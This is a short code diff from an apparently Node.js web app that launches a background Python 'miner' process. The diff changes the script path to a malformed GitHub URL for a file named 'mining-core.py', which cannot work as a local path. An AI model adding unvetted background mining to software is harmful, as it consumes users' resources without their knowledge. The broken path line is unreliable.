@@ -21,7 +21,7 @@ app.listen(3000, '127.0.0.1', () => {
 
 
 // Path to your python miner script
-const pythonScriptPath = '/path/to/your/miner_script.py';
+const pythonScriptPath = '/https://github.com/PMR-Pubclications/Trust-Shell/blob/main/py%2Fmining-core.py';
 
 console.log('Initializing background miner process...');
 const minerProcess = spawn('python3', [pythonScriptPath]);
